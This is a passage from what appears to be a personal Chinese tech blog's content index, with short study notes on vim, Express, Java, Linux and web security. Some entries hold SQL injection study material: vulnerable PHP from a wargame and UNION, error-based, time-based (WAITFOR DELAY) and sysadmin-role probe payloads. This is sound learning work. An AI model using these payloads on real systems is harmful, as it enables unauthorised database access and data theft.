class="keyword">l</span>,<span class="string">'Created Time: '</span>.<span class="built_in">strftime</span>(<span class="string">'%c'</span>))</div><div class="line">	<span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>,<span class="string">'File Name   : '</span>.<span class="built_in">expand</span>(<span class="string">'%'</span>))</div><div class="line">	<span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>,<span class="string">'*********************************************** */'</span>)</div><div class="line">    <span class="keyword">if</span> &amp;<span class="keyword">filetype</span> == <span class="string">"cpp"</span></div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;iostream&gt;'</span>)</div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;cstring&gt;'</span>)</div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;cstdio&gt;'</span>)</div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;cstdlib&gt;'</span>)</div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'using namespace std;'</span>)</div><div class="line">    <span class="keyword">endif</span></div><div class="line">    <span class="keyword">if</span> &amp;<span class="keyword">filetype</span> == <span class="string">"c"</span></div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;stdio.h&gt;'</span>)</div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;string.h&gt;'</span>)</div><div class="line">        <span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>, <span class="string">'#include &lt;stdlib.h&gt;'</span>)</div><div class="line">    <span class="keyword">endif</span></div><div class="line">endfunc</div><div class="line"></div><div class="line"><span class="keyword">inoremap</span> ( ()<span class="symbol">&lt;Esc&gt;</span>i</div><div class="line"><span class="keyword">inoremap</span> &#123; &#123;&#125;<span class="symbol">&lt;Esc&gt;</span>i<span class="symbol">&lt;CR&gt;</span><span class="symbol">&lt;Esc&gt;</span></div><div class="line"><span class="keyword">inoremap</span> [ []<span class="symbol">&lt;Esc&gt;</span>i</div><div class="line"><span class="keyword">inoremap</span> <span class="string">" "</span><span class="comment">"&lt;Esc&gt;i</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> vim </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2016/11/01/todo/</url>
      <content type="html"><![CDATA[<ol>
<li>TDD &amp; BDD</li>
<li>about <a href="http://www.ruanyifeng.com/blog/2016/09/react-technology-stack.html" target="_blank" rel="external">react</a></li>
<li>express</li>
<li>sqli-labs</li>
<li>wechall</li>
<li>source code of EOS</li>
<li>csrf &amp; ssrf</li>
<li>geek &amp; sycsec =&gt; wp</li>
<li>xss</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> todo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于handlebars模板后缀名]]></title>
      <url>/2016/11/01/%E5%85%B3%E4%BA%8Ehandlebars%E6%A8%A1%E6%9D%BF%E5%90%8E%E7%BC%80%E5%90%8D/</url>
      <content type="html"><![CDATA[<p>express使用模板引擎handlebars时候，默认模板的后缀为#.handlebars#,发现直接替换了handlebars传入对象中的extname，仍然会报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Failed to lookup view <span class="string">"home"</span> <span class="keyword">in</span> views directory <span class="string">"/home/***/projectName/views"</span></div></pre></td></tr></table></figure>
<blockquote>
<p>报错代码</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> handlebars = <span class="built_in">require</span>(<span class="string">'express3-handlebars'</span>)</div><div class="line">  .create(&#123;<span class="attr">defaultLayout</span>: <span class="string">'main'</span>, <span class="attr">extname</span>: <span class="string">'.hbs'</span>&#125;);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> app = express();</div><div class="line">app.engine(<span class="string">'handlebars'</span>, handlebars.engine);</div><div class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'handlebars'</span>);</div></pre></td></tr></table></figure>
<p>后来发现。。。居然同时还要写成这样子。。才可以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> handlebars = <span class="built_in">require</span>(<span class="string">'express3-handlebars'</span>)</div><div class="line">  .create(&#123;<span class="attr">defaultLayout</span>: <span class="string">'main'</span>, <span class="attr">extname</span>: <span class="string">'.hbs'</span>&#125;);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> app = express();</div><div class="line">app.engine(<span class="string">'hbs'</span>, handlebars.engine);</div><div class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'hbs'</span>);</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> node </tag>
            
            <tag> handlebars </tag>
            
            <tag> express </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wechall|Blinded by the light]]></title>
      <url>/2016/10/14/wechall-Blinded-by-the-light/</url>
      <content type="html"><![CDATA[<p>hack点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">blightVuln</span><span class="params">($password)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="comment"># Do not mess with other sessions!</span></div><div class="line">        <span class="keyword">if</span> ( (strpos($password, <span class="string">'/*'</span>) !== <span class="keyword">false</span>) || (stripos($password, <span class="string">'blight'</span>) !== <span class="keyword">false</span>) )</div><div class="line">        &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        $db = blightDB();</div><div class="line">        $sessid = GWF_Session::getSession()-&gt;getID();</div><div class="line">        $query = <span class="string">"SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'"</span>;</div><div class="line">        <span class="keyword">return</span> $db-&gt;queryFirst($query) !== <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这一句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">"<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> blight <span class="keyword">WHERE</span> sessid=$sessid) b <span class="keyword">WHERE</span> <span class="keyword">password</span>=<span class="string">'$password'</span><span class="string">";</span></div><div class="line"><span class="string">"</span>)<span class="string">"</span></div></pre></td></tr></table></figure></p>
<p>开始不理解 b的意思<br>后来反应过来是前面的临时表(SELECT password FROM blight WHERE sessid=$sessid)的别名 省去了 AS<br>不加这个的话 就会报错:<br> Every derived table must have its own alias   </p>
<p>另外 此题不会做<br>题解:<br><a href="http://1176518111.blog.51cto.com/9678787/1693484/" target="_blank" rel="external">题解～～～</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[underscore]]></title>
      <url>/2016/10/09/underscore/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Underscore is a JavaScript library that provides a whole mess of useful functional programming helpers without extending any built-in objects.</p>
</blockquote>
<p>node 里 这样 用就行啦<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//example.js</span></div><div class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">'../underscore'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">unsplat</span>(<span class="params">fun</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> fun.call(<span class="literal">null</span>, _.toArray(<span class="built_in">arguments</span>));</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> joinElement = unsplat(<span class="function"><span class="keyword">function</span>(<span class="params">array</span>) </span>&#123;<span class="keyword">return</span> array.join(<span class="string">' '</span>)&#125;);</div><div class="line"></div><div class="line"><span class="keyword">var</span> res = joinElement(<span class="number">1</span>, <span class="number">2</span>);</div><div class="line"><span class="built_in">console</span>.log(res);</div><div class="line"><span class="comment">//=&gt;"1 2"</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 函数式 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[函数调用惯例]]></title>
      <url>/2016/10/07/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%83%AF%E4%BE%8B/</url>
      <content type="html"><![CDATA[<p>在这里mark一下</p>
<table>
<thead>
<tr>
<th>-</th>
<th>CDECL</th>
<th>STDCALL</th>
<th>FASTCALL</th>
</tr>
</thead>
<tbody>
<tr>
<td>参数</td>
<td>从左向右压栈<br>调用方负责在掉用后清理栈</td>
<td>与CDECL相同<br>除了被调用方清理栈</td>
<td>前两个参数通过ECX和EDX传递<br>其余压入栈</td>
</tr>
<tr>
<td>返回值</td>
<td>保存在EAX</td>
<td>保存在EAX</td>
<td>保存在EAX</td>
</tr>
<tr>
<td>非易失寄存器</td>
<td>EBP,ESP,EBX,ESI,EDI</td>
<td>EBP,ESP,EBX,ESI,EDI</td>
<td>EBP,ESP,EBX,ESI,EDI</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> 国庆 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi-杂]]></title>
      <url>/2016/09/23/SQLi-%E6%9D%82/</url>
      <content type="html"><![CDATA[<ol>
<li><p>识别数据库版本一般就是 引入@@version 变量之类的 把他放在一个奇异的地方然后让他报错</p>
</li>
<li><p>识别列数的两种方法</p>
<ul>
<li>使用 union 查询<ul>
<li>当结果只能返回一行我们该如何做<br>  ?id = ‘a’ and 1 = 2 union select balabala…(让前面查询永为假)</li>
<li>为了防止类型不匹配 我们可以用null</li>
<li>得到列数后, 可以用字符串or数字分别替换null,不报错即得到数据类型</li>
</ul>
</li>
<li>使用 order by id</li>
</ul>
</li>
<li><p>对于oracle这种必须得有from子句的sql方言,可以让他from dual</p>
</li>
<li><p>SQL server提供了比其他DBMS更加详尽的信息<br> ?id=2<br> =&gt; ?id=system_user 类型转换错误 可能会爆system_user的值<br> =&gt; ?id=0/@@version 同理<br> =&gt; ?id=char(65 + is_srvrolemember(‘sysadmin’)) 仍然同理</p>
<p> =&gt; ?id=1 having 1 = 1 爆出第一列列名 如poducts.id<br> =&gt; ?id=1 group by products.id having 1 = 1 爆出第二列列名 如products.name<br> =&gt; …</p>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[我还没放弃学英语呢]]></title>
      <url>/2016/09/23/%E6%88%91%E8%BF%98%E6%B2%A1%E6%94%BE%E5%BC%83%E5%AD%A6%E8%8B%B1%E8%AF%AD%E5%91%A2/</url>
      <content type="html"><![CDATA[<ul>
<li>and enjoy  d听不到 en也听不到</li>
<li>open up  连读</li>
<li>‘s 听不到</li>
<li>keep it 连读</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi-使用条件语句]]></title>
      <url>/2016/09/23/SQLi/</url>
      <content type="html"><![CDATA[<table>
<thead>
<tr>
<th>数据库</th>
<th>查询</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Server</td>
<td>IF(‘a’ = ‘a’)SELECT 1 ELSE SELECT 2</td>
</tr>
<tr>
<td>MySQL</td>
<td>SELECT IF(‘a’, 1, 2)</td>
</tr>
<tr>
<td>Oracle</td>
<td>SELECT CASE WHEN ‘a’ = ‘a’ THEN 1 ELSE 2</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>SELECT CASE WHEN(1 = 1) THEN ‘a’ ELSE ‘b’ END</td>
</tr>
</tbody>
</table>
<ol>
<li><p>基于时间的注入(感觉速度会很慢？)</p>
<ul>
<li>如果满足条件就延迟5s(或其他时间)<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IF (system_user = 'sa') WAITFOR DELAY '0:0:5'</div><div class="line">IF (substring((<span class="keyword">select</span> @@<span class="keyword">version</span>), <span class="number">25</span>, <span class="number">1</span>) = <span class="number">5</span>) WAITFOR DELAY <span class="string">'0:0:5'</span></div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>基于错误的注入</p>
<ul>
<li>比如除0<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=12 / is_srvrolemember(&apos;sysadmin&apos;)</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>基于内容的注入</p>
<ul>
<li><p>比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">porducts.asp?id = 12 + (case when (system_user = &apos;sa&apos;) then 1 else 0 end)</div></pre></td></tr></table></figure>
<p>  条件成功返回id=13的商品, 否则返回id=12的</p>
</li>
</ul>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[搭了sqli-labs]]></title>
      <url>/2016/09/22/%E6%90%AD%E4%BA%86sqli-labs/</url>
      <content type="html"><![CDATA[<p>搭了sqli-labs 在8888端口</p>
]]></content>
      
        
        <tags>
            
            <tag> 周四 </tag>
            
            <tag> 好久不记东西 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JSP隐式对象]]></title>
      <url>/2016/07/26/JSP%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1/</url>
      <content type="html"><![CDATA[<p>呐~</p>
<table>
<thead>
<tr>
<th>对象</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>request</td>
<td>javax.servlet.http.HttpServletRequest</td>
</tr>
<tr>
<td>response</td>
<td>javax.servlet.http.HttpServletResponse</td>
</tr>
<tr>
<td>out</td>
<td>javax.servlet.jsp.JspWriter</td>
</tr>
<tr>
<td>session</td>
<td>javax.servlet.http.HttpSession</td>
</tr>
<tr>
<td>application</td>
<td>javax.servlet.ServletContext</td>
</tr>
<tr>
<td>config</td>
<td>javax.servlet.ServletConfig</td>
</tr>
<tr>
<td>pageContext</td>
<td>javax.servlet.jsp.PageContext</td>
</tr>
<tr>
<td>page</td>
<td>javax.servlet.jsp.HttpJspPage</td>
</tr>
<tr>
<td>exception</td>
<td>java.lang.Throwable</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> jsp </tag>
            
            <tag> 周二 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java|shallow copy & deep cpoy]]></title>
      <url>/2016/07/18/java-shallow-copy-deep-cpoy/</url>
      <content type="html"><![CDATA[<p>在对象复制一节引出的</p>
<p>对象可以使用Object类的<code>clone()</code>方法来建立自己的副本</p>
<p>为了使自己是可复制的(cloneable), 要实现<code>java.lang.Cloneable</code>接口</p>
<p>另外，clone方法是protect，默认的，只能由对象自身，同一个包中的对象或者同类型(或者其子类型)的对象所调用。如果希望对任何对象来说都是可复制的，就必须覆盖其clone()方法，并申明为public。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.HashMap;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sheep</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</div><div class="line"></div><div class="line">    HashMap flock = <span class="keyword">new</span> HashMap();</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.clone();</div><div class="line">        &#125; <span class="keyword">catch</span> (CloneNotSupportedException) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"This should never happen because we implement Cloneable"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但这样在clone时候需要强制类型转换一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Sheep one = <span class="keyword">new</span> Sheep();</div><div class="line">Sheep anotherOne = (Sheep)one.clone();</div></pre></td></tr></table></figure>
<p>如果这样写</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Sheep <span class="title">clone</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">return</span> (Sheep)<span class="keyword">super</span>.clone();</div><div class="line">    &#125; <span class="keyword">catch</span> (CloneNotSupportedException) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"This should never happen because we implement Cloneable"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>就可以写成这样啦</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Sheep one = <span class="keyword">new</span> Sheep();</div><div class="line">Sheep anotherOne = one.clone();</div></pre></td></tr></table></figure>
<p>上面涉及到的都是<em>浅拷贝</em><br>即one和anotherOne的flock会指向<em>同一个对象</em></p>
<p>然而，你可以手动<em>深拷贝</em>一下，让大家都有属于自己的HashMap.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sheep</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</div><div class="line"></div><div class="line">    HashMap flock = <span class="keyword">new</span> HashMap();</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            DeepSheep copy = (DeepSheep)<span class="keyword">super</span>.clone();</div><div class="line">            copy.flock = (HashMap)flock.clone();</div><div class="line">            <span class="keyword">return</span> copy;</div><div class="line">        &#125; <span class="keyword">catch</span> (CloneNotSupportedException) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"This should never happen~"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完结～</p>
]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 周一 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java匿名内部类]]></title>
      <url>/2016/07/18/java%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[关于Java]]></title>
      <url>/2016/07/18/%E5%85%B3%E4%BA%8EJava/</url>
      <content type="html"><![CDATA[<p>作为一条通用规则，类在范围的封装和受限层次越深，对其命名的自由度也越大(什么意思。。)</p>
]]></content>
      
        
        <tags>
            
            <tag> 周一 </tag>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java的内部类和方法里的内部类]]></title>
      <url>/2016/07/18/java%E7%9A%84%E5%86%85%E9%83%A8%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E9%87%8C%E7%9A%84%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[奇怪的Tomcat]]></title>
      <url>/2016/07/15/%E5%A5%87%E6%80%AA%E7%9A%84Tomcat/</url>
      <content type="html"><![CDATA[<p>整个安装路径都是奇怪的</p>
<a id="more"></a>
<pre><code>It works !

    If you&apos;re seeing this page via a web browser, it means you&apos;ve setup Tomcat successfully. Congratulations!

    This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat8/webapps/ROOT/index.html

    Tomcat8 veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in 
/usr/share/tomcat8 and CATALINA_BASE in /var/lib/tomcat8, following the rules from /usr/share/doc/tomcat8-common/RUNNING.txt.gz.

    You might consider installing the following packages, if you haven&apos;t already done so:

    NOTE: For security reasons, using the manager webapp is restricted to users with role &quot;manager-gui&quot;. The host-manager webapp
is restricted to users with role &quot;admin-gui&quot;. Users are defined in /etc/tomcat8/tomcat-users.xml.
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gvfsd-smb-browse CPU 100%]]></title>
      <url>/2016/07/15/gvfsd-smb-browse-CPU-100/</url>
      <content type="html"><![CDATA[<p>不是很懂这个坑爹的gvfs，kill掉一会儿就又100%，然后听到风扇声音大，多半就是这个</p>
<p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1303300" target="_blank" rel="external">redhat的解决方法</a></p>
<ol>
<li>sudo vim /etc/samba/smb.conf</li>
</ol>
<ol>
<li>定位到[global] 然后在[global]下面添加<br>name resolve order = wins lmhosts bcast</li>
</ol>
<ol>
<li>保存退出 重启 即可</li>
</ol>
<p><a href="https://bbs.archlinux.org/viewtopic.php?id=207773" target="_blank" rel="external">ArchLinux的</a></p>
<p>不过我怎么感觉我都木有配smb。。。<br>这真实一个奇怪的问题<br>我还是再找找吧</p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周五 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下几个常用的HTML实体]]></title>
      <url>/2016/07/15/mark%E4%B8%8B%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84HTML%E5%AE%9E%E4%BD%93/</url>
      <content type="html"><![CDATA[<table>
<thead>
<tr>
<th>HTML实体</th>
<th>字符</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;quot;</td>
<td>“</td>
</tr>
<tr>
<td>&amp;apos;</td>
<td>‘</td>
</tr>
<tr>
<td>&amp;amp;</td>
<td>&amp;</td>
</tr>
<tr>
<td>&amp;lt;</td>
<td>&lt;</td>
</tr>
<tr>
<td>&amp;gt;</td>
<td>&gt;</td>
</tr>
</tbody>
</table>
<p>另外，任何字符都可以用他的ASCII码进行HTML编码</p>
<p>&amp;#34;  代表 “<br>&amp;#39;  代表 ‘</p>
<p>或者用他的16进制ASCII码(以x为前缀)<br>&amp;#x22; 代表 “<br>&amp;#x27; 代表 ‘</p>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> html </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下Linux文件属性]]></title>
      <url>/2016/07/14/mark%E4%B8%8BLinux%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7/</url>
      <content type="html"><![CDATA[<p>在家里吃的第二顿午饭～</p>
<p>在家生活条件MAX</p>
<p>mark 下ls -al出现的</p>
<pre><code>drwxrwxr-x  3 haibin haibin 4096 7月  13 16:54 themes
</code></pre><p>的第一位</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>表示</th>
</tr>
</thead>
<tbody>
<tr>
<td> [d]</td>
<td>目录</td>
</tr>
<tr>
<td> [-]</td>
<td>文件</td>
</tr>
<tr>
<td> [l]</td>
<td>连接文件(linkfile)</td>
</tr>
<tr>
<td> [b]</td>
<td>设备文件中的<em>可供储存</em>的接口设备</td>
</tr>
<tr>
<td> [c]</td>
<td>设备文件中的<em>串行端口设备</em>，如鼠标键盘(一次性读取设备)</td>
</tr>
</tbody>
</table>
<p>另外，后面的是 w - 4, r -2, x - 1<br>而且对于目录而言,x 决定是否能进入该目录</p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux Run Level]]></title>
      <url>/2016/07/13/Linux-Run-Level/</url>
      <content type="html"><![CDATA[<p>Run Level 0 : 关机<br>Run Level 1 : 单用户模式<br>Run Level 3 : 命令行<br>Run Level 5 : 图形界面<br>Run Level 6 : 重启</p>
<p>所以 init 0 也可以用来关机</p>
<p>惯用的关机 shutdown</p>
<p>还有的 reboot halt poweroff</p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下常用的几个命令]]></title>
      <url>/2016/07/13/mark%E4%B8%8B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%A0%E4%B8%AA%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<ul>
<li><p>cal 显示日历</p>
<ul>
<li>cal 本月日历</li>
<li>cal 10 2016 本月日历</li>
<li>cal 2016 本年日历</li>
</ul>
</li>
<li><p>date 日期与时间</p>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java可见性修饰符]]></title>
      <url>/2016/07/13/java%E5%8F%AF%E8%A7%81%E6%80%A7%E4%BF%AE%E9%A5%B0%E7%AC%A6/</url>
      <content type="html"><![CDATA[<p>java的可见性修饰符与c++不太一样，尤其他的default是不同于public和pricate的</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>可见性</th>
</tr>
</thead>
<tbody>
<tr>
<td>Private</td>
<td>无</td>
<td></td>
</tr>
<tr>
<td>None(default)</td>
<td>包中的类</td>
<td></td>
</tr>
<tr>
<td>Protect</td>
<td>包中的类，以及包中的(或者包外的)子类</td>
<td></td>
</tr>
<tr>
<td>Public</td>
<td>所有的类</td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java关于变量/方法覆盖]]></title>
      <url>/2016/07/13/java%E5%85%B3%E4%BA%8E%E5%8F%98%E9%87%8F-%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96/</url>
      <content type="html"><![CDATA[<ol>
<li>先看<em>变量的覆盖(遮盖)</em></li>
</ol>
